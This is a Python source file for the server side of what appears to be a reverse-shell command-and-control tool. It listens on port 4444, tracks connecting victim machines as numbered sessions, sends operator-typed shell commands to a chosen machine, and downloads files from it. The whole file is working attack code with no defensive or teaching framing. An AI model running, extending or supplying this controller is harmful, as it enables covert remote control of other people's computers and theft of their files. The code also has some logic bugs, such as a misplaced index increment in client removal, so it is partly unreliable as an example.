# server.py

import socket
from threading import Thread
import time
import datetime
from tqdm import tqdm

HOST = "0.0.0.0"
PORT = 4444
CLIENTS = []
THREADS = []
NOW = datetime.datetime.now().strftime("%Y") + datetime.datetime.now().strftime("%m") + datetime.datetime.now().strftime("%d") + datetime.datetime.now().strftime("%H%M%S")


def _decode(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437")
        except UnicodeDecodeError:
            return data.decode(errors="replace")


def recv_all(conn, buffer):
    res = b''
    data = conn.recv(buffer)
    while data:
        res += data
        data = conn.recv(buffer)
    return res


def print_clients():
    if CLIENTS:
        for c in CLIENTS:
            print("Session", c["session"], c["ip"], "\\", c["hostname"])
    else:
        print('No clients')


def get_client_by_session_id(session):
    for c in CLIENTS:
        if int(c["session"]) == int(session):
            return c

    return False


def remove_client_by_session_id(session):
    i = 0
    for c in CLIENTS:
        if int(c["session"]) == int(session):
            del CLIENTS[i]
            break
    i = i + 1


def stop_threads():
    for th in THREADS:
        th.terminate()


def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(5)
    return sock


class app:
    def __init__(self, sock):
        self.sock = sock

    def start(self):
        accept_client = ThreadConnect()
        THREADS.append(accept_client)
        accept_thread = Thread(target=accept_client.run, args=(self.sock,))
        accept_thread.start()

        print("[+] start listening ", HOST, ":", PORT)

        while True:
            try:
                entry = input("app~$ ")
                if "sessions" == entry:
                    print_clients()
                elif "go" in entry:
                    n = entry.split(" ")[1]
                    client = get_client_by_session_id(n)
                    shell(client, self.sock)
                elif "exit" == entry:
                    stop_threads()
                    self.sock.close()
                    print("bye")
                    break
                elif "" == entry:
                    print("Invalid command invoke help")
                else:
                    print("Invalid command invoke help")
            except Exception as e:
                print("Invalid command invoke help")


def shell(client, sock):
    conn = client["conn"]
    print("Working on : ", client["ip"], "\\", client["hostname"])
    while True:
        try:
            cmd = input("app(session" + str(client["session"]) + ")~$ ")
            conn.send(cmd.encode())
            if "exit" == cmd:
                break
            elif 'download' in cmd:
                f_extension = "." + cmd.split(".")[1]
                file_size = int(conn.recv(1024))
                progress_bar = tqdm(total=file_size, unit='iB')
                f = open(NOW + f_extension, "wb")
                data_check = 0
                print(file_size)
                while data_check != int(file_size):
                    time.sleep(2)
                    data = conn.recv(5000)
                    data_size = len(data)
                    f.write(data)
                    data_check = data_check + int(len(data))
                    progress_bar.update(data_size)
                progress_bar.close()
                f.close()
            elif not cmd:
                print("Invalid command")
            else:
                print(_decode(conn.recv(10000)))
        except Exception as e:
            print(e)
            break


class ThreadConnect:
    def __init__(self):
        self.exit = False
        self.sock = ""

    def terminate(self):
        self.exit = True

    def run(self, sock):
        session = 0
        while True:
            try:
                conn, addr = sock.accept()
                host_name = conn.recv(1024).decode()
                session = session + 1
                client = {"ip": addr, "conn": conn, "session": session, "hostname": host_name}
                CLIENTS.append(client)

                # check client connected
                client_alive = ThreadClientAlive()
                THREADS.append(client_alive)
                alive_tread = Thread(target=client_alive.run, args=(conn, client["session"]))
                alive_tread.start()

            except Exception as e:
                if self.exit:
                    break
                pass
            except sock.error as e:
                if self.exit:
                    break
                pass


class ThreadClientAlive:
    def __init__(self, ):
        self.exit = False

    def terminate(self):
        self.exit = True

    def run(self, conn, session):
        while True:
            try:
                if self.exit:
                    break
                conn.send(b'areualive?')
                conn.recv(1024)
            except Exception:
                remove_client_by_session_id(session)
                break
            time.sleep(5)


def main():
    sock = start_server()
    app1 = app(sock)
    app1.start()


main()
